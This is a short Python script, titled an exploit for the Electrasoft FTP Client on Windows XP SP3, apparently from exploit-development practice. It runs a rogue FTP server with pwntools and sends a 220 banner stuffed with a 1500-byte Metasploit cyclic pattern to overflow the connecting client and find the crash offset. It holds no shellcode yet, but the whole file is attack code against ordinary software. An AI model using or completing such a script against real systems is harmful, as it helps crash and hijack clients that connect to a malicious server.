#!/usr/bin/python
# 
# Electrasoft FTP Client exploit
# Author: Kris Hunt 
#
# Target: Windows XP SP3

from pwn import *
import subprocess

print "[+] Generating payload."
buf = subprocess.check_output(['/usr/share/metasploit-framework/tools/exploit/pattern_create.rb','1500'])

l = listen(21)
conn = l.wait_for_connection()
conn.sendline('220 ' + buf + '\r\n')
conn.recv()

